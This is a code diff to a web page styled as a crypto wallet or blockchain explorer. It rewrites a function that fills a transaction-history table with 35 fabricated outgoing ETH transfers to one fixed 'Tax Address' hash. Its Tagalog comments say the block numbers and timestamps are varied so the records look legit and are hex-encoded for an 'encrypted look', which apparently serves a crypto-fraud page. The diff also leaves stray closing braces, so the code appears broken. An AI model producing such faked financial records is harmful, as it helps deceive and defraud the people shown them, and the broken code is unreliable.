@@ -197,12 +197,40 @@
         document.getElementById('market-body').innerHTML = html;
     }
 
-    function buildHistory() {
-        let body = document.getElementById('history-body');
-        let val = (24.36 / 35).toFixed(4);
-        for(let i=1; i<=35; i++) {
-            body.innerHTML += `<tr><td class="hash">0x8a${i}c...9e4f</td><td><span class="method">Transfer</span></td>
-            <td>1779${i}557</td><td style="color:var(--text-gray)">17794557</td><td>0x71C...d289</td><td>0xbc4...11d0</td><td style="color:var(--down)">- ${val} ETH</td></tr>`;
+        function buildHistory() {
+        const body = document.getElementById('history-body');
+        const ethVal = (24.36 / 35).toFixed(4);
+        
+        // Isang hash lang (Tax Address) gaya ng request mo
+        const fixedHash = "0x823b56EC7ab88b098defB751B7401B5f6d8911";
+        
+        // Simula ng Block at Timestamp (2024 era)
+        let startBlock = 19455700; 
+        let startTimestamp = 1714557000; 
+
+        body.innerHTML = ""; // Siguradong malinis yung table bago lagyan
+
+        for(let i = 1; i <= 35; i++) {
+            // Nagbabago ang block at oras kada loop para magmukhang legit
+            let currentBlock = startBlock + (i * 15); 
+            let currentTS = startTimestamp + (i * 120); 
+            
+            // I-convert yung timestamp sa Hex (Encrypted look)
+            let encryptedTS = "0x" + currentTS.toString(16).toUpperCase();
+
+            body.innerHTML += `
+                <tr>
+                    <td class="hash">${fixedHash}</td>
+                    <td><span class="method">Transfer</span></td>
+                    <td>${currentBlock}</td>
+                    <td style="color:var(--encryption); font-family:monospace;">${encryptedTS}</td>
+                    <td>0x71C...d289</td>
+                    <td>0xbc4...11d0</td>
+                    <td style="color:var(--down)">- ${ethVal} ETH</td>
+                </tr>`;
+        }
+    }
+
         }
     }
 
